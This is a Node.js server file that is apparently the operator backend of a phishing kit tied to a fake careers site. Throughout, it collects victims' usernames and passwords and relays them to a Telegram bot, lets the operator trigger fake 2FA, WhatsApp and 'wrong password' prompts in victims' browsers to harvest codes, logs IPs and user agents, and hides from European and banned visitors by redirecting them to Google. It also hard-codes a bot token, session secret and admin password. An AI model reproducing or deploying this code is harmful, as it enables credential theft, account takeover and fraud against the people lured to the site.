const express = require('express');
const session = require('express-session');
const basicAuth = require('basic-auth');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');
const UAParser = require('ua-parser-js');
const { sendTelegramMessage } = require('./bot/telegram');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const geoip = require('geoip-lite');

const app = express();
const server = http.createServer(app);

// 🧩 Telegram webhook setup
const TELEGRAM_TOKEN = '8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus';
const APP_URL = process.env.RENDER_EXTERNAL_URL || 'https://jobback-qp48.onrender.com';
const WEBHOOK_PATH = `/bot${TELEGRAM_TOKEN}`;
const WEBHOOK_URL = `${APP_URL}${WEBHOOK_PATH}`;
console.log('🔗 Setting up Telegram webhook...');
console.log('🌍 APP_URL:', APP_URL);
console.log('📡 WEBHOOK_URL:', WEBHOOK_URL);

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// ✅ Move helpers to top so they’re defined before use
const users = {};
const userData = {};
const socketToClient = {};

function getSocketIdByClientId(clientId) {
  return Object.entries(socketToClient).find(([_, cid]) => cid === clientId)?.[0];
}

function emitToClient(clientId, event, data = null) {
  const socketId = getSocketIdByClientId(clientId);
  if (socketId && users[socketId]) {
    console.log(`📡 Emitting event "${event}" to client: ${clientId}`);
    users[socketId].emit(event, data);
  } else {
    console.warn(`⚠️ No socket found for client: ${clientId}`);
  }
}

function disconnectClient(clientId) {
  const socketId = getSocketIdByClientId(clientId);
  if (socketId && users[socketId]) {
    console.log(`🔌 Disconnecting client: ${clientId}`);
    users[socketId].disconnect(true);
  }
}

// ✅ Set webhook
bot.setWebHook(WEBHOOK_URL)
  .then(() => console.log(`✅ Webhook set to: ${WEBHOOK_URL}`))
  .catch(err => console.error('❌ Failed to set webhook:', err.message));

app.use(express.json());
app.post(WEBHOOK_PATH, (req, res) => {
  console.log('📩 Incoming Telegram update:', JSON.stringify(req.body, null, 2));
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ✅ Session
app.use(session({
  secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: true, sameSite: 'none', maxAge: 24 * 60 * 60 * 1000 }
}));

// ✅ CORS
app.use(cors({
  origin: ['https://aquentcareers.io', 'https://jobback-qp48.onrender.com'],
  methods: ['GET', 'POST'],
  credentials: true
}));
app.use(express.json());

const io = socketIo(server, {
  cors: { origin: ['https://aquentcareers.io', 'https://jobback-qp48.onrender.com'], methods: ['GET', 'POST'] }
});

// ✅ Auth
function auth(req, res, next) {
  if (req.session && req.session.authenticated) return next();
  const user = basicAuth(req);
  const username = 'ttwstt';
  const password = 'Neo.123!@#';
  if (user && user.name === username && user.pass === password) {
    req.session.authenticated = true;
    console.log('✅ Admin logged in');
    return next();
  }
  res.set('WWW-Authenticate', 'Basic realm="Restricted Area"');
  return res.status(401).send('Authentication required.');
}

// ✅ Static files
const BAN_LIST_FILE = path.join(__dirname, 'ban_ips.txt');
app.use('/dash', auth, express.static(path.join(__dirname, 'aZ7pL9qW3xT2eR6vBj0K')));
app.use('/public', express.static(path.join(__dirname, 'public')));

const newUsers = new Set();

// ✅ Telegram callback query
bot.on('callback_query', (query) => {
  console.log('⚡ Telegram callback query received:', query.data);
  const [command, clientId] = query.data.split(':');

  const map = {
    send_2fa: 'show-2fa',
    send_auth: 'show-auth',
    send_email: 'show-email',
    send_wh: 'show-whatsapp',
    send_wrong_creds: 'show-wrong-creds',
    send_old_pass: 'show-old-pass',
    send_calendar: 'show-calendar',
  };

  if (command === 'disconnect') {
    disconnectClient(clientId);
    bot.answerCallbackQuery(query.id, { text: 'Client disconnected.' });
  } else if (map[command]) {
    console.log(`📤 Sending command "${command}" to client ${clientId}`);
    emitToClient(clientId, map[command]);
    bot.answerCallbackQuery(query.id, { text: `Sent ${command.replace('_', ' ')}` });
    const msg = `📩 *Command Sent to Client*\n\n📤 *Command:* \`${command}\`\n🆔 *Client ID:* \`${clientId}\``;
    sendTelegramMessage(msg, clientId, true);
  } else if (command === 'ban_ip') {
    const ip = userData[clientId]?.ip;
    if (ip) {
      banIp(ip);
      console.log(`🚫 Banned IP: ${ip}`);
      bot.answerCallbackQuery(query.id, { text: `Banned IP: ${ip}` });
      disconnectClient(clientId);
      sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
    } else bot.answerCallbackQuery(query.id, { text: 'IP not found.' });
  } else bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
});

// ✅ Helper functions
function formatDateTime(date) {
  return {
    full: date.toISOString(),
    date: date.toLocaleDateString(),
    time: date.toLocaleTimeString(),
    timestamp: Date.now()
  };
}

function updatePanelUsers() {
  const data = Object.values(userData)
    .filter(u => u?.time?.timestamp && Date.now() - u.time.timestamp <= 2 * 60 * 60 * 1000)
    .sort((a, b) => b.time.timestamp - a.time.timestamp);
  io.of('/panel').emit('update-users', { users: data, newUsers: Array.from(newUsers) });
  console.log(`👥 Updated panel users: ${data.length}`);
}

function isBanned(ip) {
  try { return fs.readFileSync(BAN_LIST_FILE, 'utf8').split('\n').includes(ip.trim()); }
  catch { return false; }
}

function banIp(ip) {
  const clean = ip.trim();
  if (!isBanned(clean)) {
    try {
      if (fs.existsSync(BAN_LIST_FILE)) {
        const data = fs.readFileSync(BAN_LIST_FILE, 'utf8');
        if (!data.endsWith('\n')) fs.appendFileSync(BAN_LIST_FILE, '\n');
      }
      fs.appendFileSync(BAN_LIST_FILE, `${clean}\n`);
      console.log(`🚫 IP added to ban list: ${clean}`);
    } catch (err) { console.error('Error saving banned IP:', err); }
  }
}

// ✅ Socket.io
io.on('connection', async (socket) => {
  const clientIP = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
  const userAgent = socket.handshake.headers['user-agent'];
  const timestamp = formatDateTime(new Date());
  console.log(`🧩 New socket connection from IP: ${clientIP}`);

  const geo = geoip.lookup(clientIP);
  const isEuropean = geo && geo.country &&
    ['AL','AD','AT','BE','BA','BG','BY','CH','CY','CZ','DE','DK','EE','ES','FI','FR','GB','GR','HR','HU','IE','IS','IT','LT','LU','LV','MC','MD','ME','MK','MT','NL','NO','PL','PT','RO','RS','RU','SE','SI','SK','SM','UA','VA'].includes(geo.country);

  if (isBanned(clientIP) || isEuropean) {
    console.log(`❌ Blocked IP: ${clientIP}`);
    socket.emit('redirect', 'https://www.google.com/');
    socket.disconnect();
    return;
  }

  let clientId = socket.handshake.query.clientId;
  if (!clientId) {
    clientId = crypto.randomBytes(16).toString('hex');
    socket.emit('assign-client-id', clientId);
    console.log(`🆔 Assigned new clientId: ${clientId}`);
  }

  socketToClient[socket.id] = clientId;
  users[socket.id] = socket;

  userData[clientId] = {
    ...(userData[clientId] || {}),
    id: clientId,
    ip: clientIP,
    userAgent,
    time: timestamp,
    isConnected: true,
    login: userData[clientId]?.login || {},
    codes: userData[clientId]?.codes || [],
    action: null
  };

  newUsers.add(clientId);
  updatePanelUsers();

  socket.on('disconnect', () => {
    console.log(`❌ Disconnected: ${clientId}`);
    if (userData[clientId]) userData[clientId].isConnected = false;
    delete users[socket.id];
    delete socketToClient[socket.id];
    newUsers.delete(clientId);
    updatePanelUsers();
  });
});

// ✅ POST endpoint: send-login-data
app.post('/send-login-data', (req, res) => {
  const { username, password, socketId } = req.body;
  console.log('📨 Received /send-login-data:', req.body);
  if (!username || !password) return res.status(400).json({ message: 'Username and password are required.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });

  // 🔐 Your message block preserved
  const message = `🔐 *Login Attempt*\n\n` +
    `🔷 *Username:* \`${username}\`\n` +
    `🔑 *Password:* \`${password}\`\n` +
    `Client ID: \`${clientId}\``;

  sendTelegramMessage(message, clientId, true);
  console.log('✅ Login data sent to Telegram for client:', clientId);

  userData[clientId].login = { username, password };
  userData[clientId].action = 'Login';
  updatePanelUsers();

  res.json({ success: true, message: 'Login data sent successfully!' });
});

// ✅ Start server
server.listen(3001, () => {
  console.log('🚀 Server running on http://localhost:3001');
  console.log(`✅ Telegram Webhook URL: ${WEBHOOK_URL}`);
});
